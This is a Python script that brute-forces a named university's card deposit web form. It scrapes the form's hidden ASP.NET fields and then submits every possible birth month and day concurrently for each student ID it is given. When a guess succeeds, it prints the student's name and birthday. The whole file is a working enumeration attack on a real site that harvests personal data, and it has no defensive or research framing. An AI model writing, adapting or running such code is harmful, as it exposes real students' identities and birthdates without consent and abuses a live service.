import asyncio
from concurrent.futures import as_completed
from multiprocessing.sharedctypes import Value
from requests_futures.sessions import FuturesSession

from dataclasses import dataclass
import sys

from bs4 import BeautifulSoup
import requests

from birthdays import ALL_BIRTHDAYS, Birthday


CC_BASE_URL = 'https://livingat.wsu.edu/cardinfo/deposit/default.aspx'
CC_DEPOSIT_URL = 'https://livingat.wsu.edu/cardinfo/deposit/depositForm.aspx'

session = FuturesSession()


@dataclass
class Student:
    wsu_id: str
    name: str
    birthday: Birthday


def get_hidden_inputs():
    """Scrape hidden CSRF inputs"""
    r = requests.get(CC_BASE_URL)
    bs = BeautifulSoup(r.content, 'html.parser')

    return {
        "__EVENTTARGET": "ctl00$mainContent$btnContinue",
        "__VIEWSTATE": bs.find(id="__VIEWSTATE").get('value'),
        "__EVENTVALIDATION": bs.find(id="__EVENTVALIDATION").get('value'),
    }


def create_request(hidden_inputs, wsu_id, birthday):
    form_data = {
        **hidden_inputs,
        "ctl00$mainContent$txtWSUID": wsu_id,
        "ctl00$mainContent$DropDownListMonth": birthday.month,
        "ctl00$mainContent$DropDownListDay": birthday.day,
    }

    future = session.post(CC_BASE_URL, form_data)
    future.birthday = birthday

    return future


def check_birthday(r) -> bool | str:
    bs = BeautifulSoup(r.content, 'html.parser')

    if not r.history:
        return False
    if CC_DEPOSIT_URL in [*(h.url for h in r.history), r.url]:
        # Hit the jackpot
        if not (name := bs.find(id="ctl00_mainContent_lblName")):
            return True  # Sometimes the page redirects too far
        else:
            return name.text.lstrip(" - ")
    else:
        print(bs.prettify())
        raise RuntimeError("Unexpected page format")


async def lookup_wsu_ids(wsu_id):
    hidden_inputs = get_hidden_inputs()

    checks = [
        create_request(hidden_inputs, wsu_id, birthday)
        for birthday in ALL_BIRTHDAYS
    ]

    for request in as_completed(checks, timeout=10*60):
        birthday = request.birthday

        try:
            name = check_birthday(request.result())
        except Exception:
            print(f"Failed on {birthday}")
            raise

        if name:
            if not isinstance(name, str):
                name = "<name not rendered, try again>"
            student = Student(wsu_id, name, birthday)
            print(f"Found {student}")
            return student
    else:
        print(f"No results found for {wsu_id}")


def main():
    for arg in sys.argv[1:]:
        print(f"Processing {arg}")
        asyncio.run(lookup_wsu_ids(arg))


if __name__ == '__main__':
    main()
